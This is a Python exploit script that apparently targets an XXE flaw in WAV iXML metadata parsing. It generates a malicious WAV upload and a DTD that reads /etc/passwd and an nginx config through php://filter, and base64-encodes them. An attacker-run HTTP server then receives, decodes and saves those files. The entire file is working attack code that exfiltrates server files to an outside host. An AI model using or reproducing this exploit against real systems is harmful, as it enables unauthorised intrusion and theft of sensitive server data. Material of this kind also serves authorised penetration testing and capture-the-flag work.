#!/usr/bin/python
import base64
import sys
from urllib.parse import urlparse, parse_qs
from http import server
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Dict, List
import logging
from colored_formatter import ColoredFormatter


logging.root.setLevel(logging.NOTSET)
logger = logging.getLogger(__file__)
color_handler = logging.StreamHandler()
color_handler.setLevel(logging.DEBUG)
color_handler.setFormatter(ColoredFormatter())
logger.addHandler(color_handler)

remote_files_to_fetch = [
    "/etc/passwd",
    "/etc/nginx/sites-enabled/default",
]

EXTRACTION_DTD = "index.dtd"
SEPARATOR = "---"


class ExploitHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    def do_GET(self):
        self.do_HEAD()

        if self.path == f"/{EXTRACTION_DTD}":
            with open(EXTRACTION_DTD, "rb") as file:
                file_content = file.read()
                self.wfile.write(file_content)
                logger.info(
                    "dtd payload has been succesfully loaded onto the target server."
                )
        elif self.path.startswith("/?"):
            processed_path = self.path.replace(SEPARATOR, "&")
            parsed_request_url = urlparse(processed_path)
            extracted_files = parse_qs(parsed_request_url.query)
            logger.info(
                f"Received the following files: {', '.join(extracted_files.keys())}"
            )
            extracted_files = sanitize_extracted_files(extracted_files)
            write_extracted_files(extracted_files)
        else:
            logger.debug(self.path)


def sanitize_extracted_files(extracted_files: List[Dict]) -> List[Dict]:
    for extracted_file in extracted_files:
        extracted_files[extracted_file] = extracted_files[extracted_file][0].replace(
            " ", "+"
        )
    return extracted_files


def write_extracted_files(extracted_files: List[Dict]):
    for extracted_file in extracted_files:
        with open(extracted_file, "w") as new_file:
            new_file.write(
                base64.b64decode(extracted_files[extracted_file]).decode("utf-8")
            )


def generate_wav_media_payload(
    media_payload_file_path: str, ip_address: str, port: str
):
    logger.info(
        f"Generating media payload [connect_back ip address: {ip_address}, connect back port: {port}]"
    )
    media_payload = f"RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version=\"1.0\"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://{ip_address}:{port}/{EXTRACTION_DTD}'>%remote;%init;%trick;]>\x00"
    with open(media_payload_file_path, "w", encoding="latin-1") as media_payload_file:
        media_payload_file.write(media_payload)
    logger.info(f"Payload generated and stored in {media_payload_file_path}")


def generate_dtd_payload(ip_address: str, port: str):
    logger.info(
        f"Generating the dtd payload to extract the following files: {', '.join(remote_files_to_fetch)}"
    )
    read_and_encode_local_files = ""
    exfil_local_files = (
        f"<!ENTITY % init \"<!ENTITY &#x25; trick SYSTEM 'http://{ip_address}:{port}/?"
    )

    for remote_file in remote_files_to_fetch:
        normalized_remote_file = remote_file.replace("/", "_")

        read_and_encode_local_files += f'<!ENTITY % {normalized_remote_file} SYSTEM "php://filter/read=convert.base64-encode/resource={remote_file}">'
        exfil_local_files += (
            f"{normalized_remote_file}=%{normalized_remote_file};{SEPARATOR}"
        )

    exfil_local_files += "'>\" >"

    with open(EXTRACTION_DTD, "w") as dtd_file:
        dtd_file.write(read_and_encode_local_files + exfil_local_files)


if len(sys.argv) == 4:
    ip_address = sys.argv[1]
    port = sys.argv[2]
    output_file = sys.argv[3]

    generate_wav_media_payload(output_file, ip_address, port)
    generate_dtd_payload(ip_address, port)

    server = HTTPServer(("", int(port)), ExploitHandler)
    logger.info("Starting server, use <Ctrl-C> to stop")
    server.serve_forever()

else:
    logger.info(f"Usage: ./{sys.argv[0]} ip_address port output_file")
